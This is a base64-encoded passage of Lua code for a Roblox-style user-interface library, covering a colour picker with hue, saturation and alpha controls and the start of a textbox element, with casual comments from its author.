gICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImFscGhhX3BpY2tlciIgXQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdic2Vxe3JnYmtleSgwLCByZ2IoMCwgMCwgMCkpLCByZ2JrZXkoMSwgcmdiKDI1NSwgMjU1LCAyNTUpKX07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYWxwaGFfZ3JhZGllbnQiIF0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImFscGhhX2luZGljYXRvciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiSW1hZ2VMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFNjYWxlVHlwZSA9IEVudW0uU2NhbGVUeXBlLlRpbGU7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJhbHBoYV9ncmFkaWVudCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzE4Mjc0NDUyNDQ5IjsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGlsZVNpemUgPSBkaW0yKDAsIDYsIDAsIDYpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUdyYWRpZW50IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3IgPSByZ2JzZXF7cmdia2V5KDAsIHJnYigxMTIsIDExMiwgMTEyKSksIHJnYmtleSgxLCByZ2IoMjU1LCAwLCAwKSl9OwogICAgICAgICAgICAgICAgICAgICAgICBUcmFuc3BhcmVuY3kgPSBudW1zZXF7bnVta2V5KDAsIDAuODA2MjQ5OTc2MTU4MTQyMSksIG51bWtleSgxLCAwKX07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYWxwaGFfaW5kaWNhdG9yIiBdCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYWxwaGFfaW5kaWNhdG9yIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNikKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJR3JhZGllbnQiICwgewogICAgICAgICAgICAgICAgICAgICAgICBSb3RhdGlvbiA9IDkwOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNvbG9ycGlja2VyX2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdic2Vxe3JnYmtleSgwLCByZ2IoMjU1LCAyNTUsIDI1NSkpLCByZ2JrZXkoMSwgcmdiKDY2LCA2NiwgNjYpKX0KICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJveCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDEsIDEpOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXJfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRUcnVuY2F0ZSA9IEVudW0uVGV4dFRydW5jYXRlLkF0RW5kOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBQbGFjZWhvbGRlckNvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICAgICAgQ3Vyc29yUG9zaXRpb24gPSAtMTsKICAgICAgICAgICAgICAgICAgICAgICAgQ2xlYXJUZXh0T25Gb2N1cyA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzIpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAtOCwgMSwgLTExKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTE2LCAwLCAxOCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzMsIDMzLCAzNSkKICAgICAgICAgICAgICAgICAgICB9KTsgCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5wdXQiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCAzKQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiVUlDb3JlbnIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsgLS0gZmlyZSBtaXNzdHlwbyAoaW0gbm90IGZpeGluZyB0aGlzIFJBV1IpCiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXJfaG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAtLSAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBlbmQ7CgogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0X3Zpc2libGUoYm9vbCkKICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXJfZmFkZSIgXS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICAgICAgaXRlbXNbICJjb2xvcnBpY2tlcl9ob2xkZXIiIF0uUGFyZW50ID0gYm9vbCBhbmQgbGlicmFyeVsgIml0ZW1zIiBdIG9yIGxpYnJhcnlbICJvdGhlciIgXQogICAgICAgICAgICAgICAgaXRlbXNbICJjb2xvcnBpY2tlcl9ob2xkZXIiIF0uUG9zaXRpb24gPSBkaW1fb2Zmc2V0KGl0ZW1zWyAiY29sb3JwaWNrZXIiIF0uQWJzb2x1dGVQb3NpdGlvbi5YLCBpdGVtc1sgImNvbG9ycGlja2VyIiBdLkFic29sdXRlUG9zaXRpb24uWSArIGl0ZW1zWyAiY29sb3JwaWNrZXIiIF0uQWJzb2x1dGVTaXplLlkgKyA0NSkKCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiY29sb3JwaWNrZXJfZmFkZSIgXSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAwLjQpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiY29sb3JwaWNrZXJfaG9sZGVyIiBdLCB7UG9zaXRpb24gPSBpdGVtc1sgImNvbG9ycGlja2VyX2hvbGRlciIgXS5Qb3NpdGlvbiArIGRpbV9vZmZzZXQoMCwgMjApfSkgLS0gcDEwMCBjaGVjawogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub3QgKHNlbGYuc2FuaXR5IGFuZCBsaWJyYXJ5LmN1cnJlbnRfb3BlbiA9PSBzZWxmIGFuZCBzZWxmLm9wZW4pIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjbG9zZV9lbGVtZW50KGNmZykKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXQoY29sb3IsIGFscGhhKQogICAgICAgICAgICAgICAgaWYgdHlwZShjb2xvcikgPT0gImJvb2xlYW4iIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgaWYgY29sb3IgdGhlbiAKICAgICAgICAgICAgICAgICAgICBoLCBzLCB2ID0gY29sb3I6VG9IU1YoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGFscGhhIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgYSA9IGFscGhhCiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIENvbG9yID0gaHN2KGgsIHMsIHYpCgogICAgICAgICAgICAgICAgLS0gT2sgc28gcXVpY2sgc3RvcnksIHNob3VsZCBJIGNhY2hlIGFueSBvZiB0aGlzPyBuby4uLj8/IGFueXdheXMgSSBrbm93IHRoaXMgY29kZSBpcyB2ZXJ5IGJhZCBidXQgaXRzIHlvdXIgZmF1bHQgZm9yIGJ1eWluZyBhIHVpIHdpdGggYW5pbWF0aW9ucyAob24gYSBzZXJpb3VzIG5vdGUgaW0gdG9vIGxhenkgdG8gbWFrZSB0aGlzIGxvb2sgbmljZSkKICAgICAgICAgICAgICAgIC0tIEFsc28gZnVydGhlciBub3RlLCB5ZWFoIEkga2luZCBvZiBkaWQgdGhpcyBzY2FsZV9mYWN0b3IgKiBzaXplLXZhbHVlc2l6ZS5wbGFuZSBiZWNhdXNlIHRoZW4gSSB3b3VsZCBoYXZlIHRvIGRvIHRvbWZvb2xlcnkgdG8gbWFrZSBpdCBjbGlwIHByb3Blcmx5LgogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgImh1ZV9waWNrZXIiIF0sIHtQb3NpdGlvbiA9IGRpbTIoMCwgKGl0ZW1zWyAiaHVlX2dyYWRpZW50IiBdLkFic29sdXRlU2l6ZS5YIC0gaXRlbXNbICJodWVfcGlja2VyIiBdLkFic29sdXRlU2l6ZS5YKSAqIGgsIDAuNSwgMCl9LCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciwgMC4wNSkKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJhbHBoYV9waWNrZXIiIF0sIHtQb3NpdGlvbiA9IGRpbTIoMCwgKGl0ZW1zWyAiYWxwaGFfZ3JhZGllbnQiIF0uQWJzb2x1dGVTaXplLlggLSBpdGVtc1sgImFscGhhX3BpY2tlciIgXS5BYnNvbHV0ZVNpemUuWCkgKiAoMSAtIGEpLCAwLjUsIDApfSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIsIDAuMDUpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAic2F0dmFscGlja2VyIiBdLCB7UG9zaXRpb24gPSBkaW0yKDAsIHMgKiAoaXRlbXNbICJzYXR1cmF0aW9uX2hvbGRlciIgXS5BYnNvbHV0ZVNpemUuWCAtIGl0ZW1zWyAic2F0dmFscGlja2VyIiBdLkFic29sdXRlU2l6ZS5YKSwgMSwgMSAtIHYgKiAoaXRlbXNbICJzYXR1cmF0aW9uX2hvbGRlciIgXS5BYnNvbHV0ZVNpemUuWSAtIGl0ZW1zWyAic2F0dmFscGlja2VyIiBdLkFic29sdXRlU2l6ZS5ZKSl9LCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciwgMC4wNSkKCiAgICAgICAgICAgICAgICBpdGVtc1sgImFscGhhX2luZGljYXRvciIgXTpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlVJR3JhZGllbnQiKS5Db2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDExMiwgMTEyLCAxMTIpKSwgcmdia2V5KDEsIGhzdihoLCAxLCAxKSl9OyAtLSBzaGl0IGNvZGUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJjb2xvcnBpY2tlciIgXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IKICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXJfaW5saW5lIiBdLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcgogICAgICAgICAgICAgICAgaXRlbXNbICJzYXR1cmF0aW9uX2hvbGRlciIgXS5CYWNrZ3JvdW5kQ29sb3IzID0gaHN2KGgsIDEsIDEpCgogICAgICAgICAgICAgICAgaXRlbXNbICJodWVfcGlja2VyIiBdLkJhY2tncm91bmRDb2xvcjMgPSBoc3YoaCwgMSwgMSkKICAgICAgICAgICAgICAgIGl0ZW1zWyAiYWxwaGFfcGlja2VyIiBdLkJhY2tncm91bmRDb2xvcjMgPSBoc3YoaCwgMSwgMSAtIGEpCiAgICAgICAgICAgICAgICBpdGVtc1sgInNhdHZhbHBpY2tlciIgXS5CYWNrZ3JvdW5kQ29sb3IzID0gaHN2KGgsIHMsIHYpCgogICAgICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gewogICAgICAgICAgICAgICAgICAgIENvbG9yID0gQ29sb3I7CiAgICAgICAgICAgICAgICAgICAgVHJhbnNwYXJlbmN5ID0gYSAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgY29sb3IgPSBpdGVtc1sgImNvbG9ycGlja2VyIiBdLkJhY2tncm91bmRDb2xvcjMKICAgICAgICAgICAgICAgIGl0ZW1zWyAiaW5wdXQiIF0uVGV4dCA9IHN0cmluZy5mb3JtYXQoIiVzLCAlcywgJXMsICIsIGxpYnJhcnk6cm91bmQoY29sb3IuUiAqIDI1NSksIGxpYnJhcnk6cm91bmQoY29sb3IuRyAqIDI1NSksIGxpYnJhcnk6cm91bmQoY29sb3IuQiAqIDI1NSkpCiAgICAgICAgICAgICAgICBpdGVtc1sgImlucHV0IiBdLlRleHQgLi49IGxpYnJhcnk6cm91bmQoMSAtIGEsIDAuMDEpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNmZy5jYWxsYmFjayhDb2xvciwgYSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBjZmcudXBkYXRlX2NvbG9yKCkgCiAgICAgICAgICAgICAgICBsb2NhbCBtb3VzZSA9IHVpczpHZXRNb3VzZUxvY2F0aW9uKCkgCiAgICAgICAgICAgICAgICBsb2NhbCBvZmZzZXQgPSB2ZWMyKG1vdXNlLlgsIG1vdXNlLlkgLSBndWlfb2Zmc2V0KSAKCiAgICAgICAgICAgICAgICBpZiBkcmFnZ2luZ19zYXQgdGhlbgkKICAgICAgICAgICAgICAgICAgICBzID0gbWF0aC5jbGFtcCgob2Zmc2V0IC0gaXRlbXNbInNhdCJdLkFic29sdXRlUG9zaXRpb24pLlggLyBpdGVtc1sic2F0Il0uQWJzb2x1dGVTaXplLlgsIDAsIDEpCiAgICAgICAgICAgICAgICAgICAgdiA9IDEgLSBtYXRoLmNsYW1wKChvZmZzZXQgLSBpdGVtc1sic2F0Il0uQWJzb2x1dGVQb3NpdGlvbikuWSAvIGl0ZW1zWyJzYXQiXS5BYnNvbHV0ZVNpemUuWSwgMCwgMSkKICAgICAgICAgICAgICAgIGVsc2VpZiBkcmFnZ2luZ19odWUgdGhlbgogICAgICAgICAgICAgICAgICAgIGggPSBtYXRoLmNsYW1wKChvZmZzZXQgLSBpdGVtc1sgImh1ZV9ncmFkaWVudCIgXS5BYnNvbHV0ZVBvc2l0aW9uKS5YIC8gaXRlbXNbICJodWVfZ3JhZGllbnQiIF0uQWJzb2x1dGVTaXplLlgsIDAsIDEpCiAgICAgICAgICAgICAgICBlbHNlaWYgZHJhZ2dpbmdfYWxwaGEgdGhlbgogICAgICAgICAgICAgICAgICAgIGEgPSAxIC0gbWF0aC5jbGFtcCgob2Zmc2V0IC0gaXRlbXNbICJhbHBoYV9ncmFkaWVudCIgXS5BYnNvbHV0ZVBvc2l0aW9uKS5YIC8gaXRlbXNbICJhbHBoYV9ncmFkaWVudCIgXS5BYnNvbHV0ZVNpemUuWCwgMCwgMSkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGNmZy5zZXQoKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXIiIF0uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgIGNmZy5vcGVuID0gbm90IGNmZy5vcGVuIAoKICAgICAgICAgICAgICAgICAgICBjZmcuc2V0X3Zpc2libGUoY2ZnLm9wZW4pICAgCiAgICAgICAgICAgICAgICBlbmQgICAgICAgICAgCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIHVpcy5JbnB1dENoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgICAgICAgICAgICAgIGlmIChkcmFnZ2luZ19zYXQgb3IgZHJhZ2dpbmdfaHVlIG9yIGRyYWdnaW5nX2FscGhhKSBhbmQgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgIGNmZy51cGRhdGVfY29sb3IoKSAKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsaWJyYXJ5OmNvbm5lY3Rpb24odWlzLklucHV0RW5kZWQsIGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgIGRyYWdnaW5nX3NhdCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZHJhZ2dpbmdfaHVlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBkcmFnZ2luZ19hbHBoYSA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSAgICAKCiAgICAgICAgICAgIGl0ZW1zWyAiYWxwaGFfZ3JhZGllbnQiIF0uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKElucHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSW5wdXQuVXNlcklucHV0VHlwZSB+PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBkcmFnZ2luZ19hbHBoYSA9IHRydWUgCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGl0ZW1zWyAiaHVlX2dyYWRpZW50IiBdLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihJbnB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIElucHV0LlVzZXJJbnB1dFR5cGUgfj0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgZHJhZ2dpbmdfaHVlID0gdHJ1ZSAKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgaXRlbXNbICJzYXQiIF0uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKElucHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSW5wdXQuVXNlcklucHV0VHlwZSB+PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBkcmFnZ2luZ19zYXQgPSB0cnVlICAKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXS5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCB0ZXh0ID0gaXRlbXNbICJpbnB1dCIgXS5UZXh0CiAgICAgICAgICAgICAgICBsb2NhbCByLCBnLCBiLCBhID0gbGlicmFyeTpjb252ZXJ0KHRleHQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHIgYW5kIGcgYW5kIGIgYW5kIGEgdGhlbiAKICAgICAgICAgICAgICAgICAgICBjZmcuc2V0KHJnYihyLCBnLCBiKSwgMSAtIGEpCiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGl0ZW1zWyAiaW5wdXQiIF0uRm9jdXNlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJpbnB1dCIgXSwge1RleHRDb2xvcjMgPSByZ2IoMjQ1LCAyNDUsIDI0NSl9KQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBpdGVtc1sgImlucHV0IiBdLkZvY3VzTG9zdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJpbnB1dCIgXSwge1RleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Mil9KQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBjZmcuc2V0KGNmZy5jb2xvciwgY2ZnLmFscGhhKQogICAgICAgICAgICBjb25maWdfZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLnNldAoKICAgICAgICAgICAgcmV0dXJuIHNldG1ldGF0YWJsZShjZmcsIGxpYnJhcnkpCiAgICAgICAgZW5kIAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnRleHRib3gob3B0aW9ucykgCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsKICAgICAgICAgICAgICAgIG5hbWUgPSBvcHRpb25zLm5hbWUgb3IgIlRleHRCb3giLAogICAgICAgICAgICAgICAgcGxhY2Vob2xkZXIgPSBvcHRpb25zLnBsYWNlaG9sZGVyIG9yIG9wdGlvbnMucGxhY2Vob2xkZXJ0ZXh0IG9yIG9wdGlvbnMuaG9sZGVyIG9yIG9wdGlvbnMuaG9sZGVydGV4dCBvciAidHlwZSBoZXJlLi4uIiwKICAgICAgICAgICAgICAgIGRlZmF1bHQgPSBvcHRpb25zLmRlZmF1bHQgb3IgIiIsCiAgICAgICAgICAgICAgICBmbGFnID0gb3B0aW9ucy5mbGFnIG9yIGxpYnJhcnk6bmV4dF9mbGFnKCksCiAgICAgICAgICAgICAgICBjYWxsYmFjayA9IG9wdGlvbnMuY2FsbGJhY2sgb3IgZnVuY3Rpb24oKSBlbmQsCiAgICAgICAgICAgICAgICB2aXNpYmxlID0gb3B0aW9ucy52aXNpYmxlIG9yIHRydWUsCiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwogICAgICAgICAgICB9CgogICAgICAgICAgICBmbGFnc1tjZmcuZmxhZ10gPSBjZmcuZGVmYXVsdAoKICAgICAgICAgICAgbG9jYWwgaXRlbXMgPSBjZmcuaXRlbXM7IGRvIAogICAgICAgICAgICAgICAgaXRlbXNbICJ0ZXh0Ym94IiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICBMYXlvdXRPcmRlciA9IC0xOwogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgImVsZW1lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAibmFtZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidGV4dGJveCIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgNSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInRleHRib3giIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0y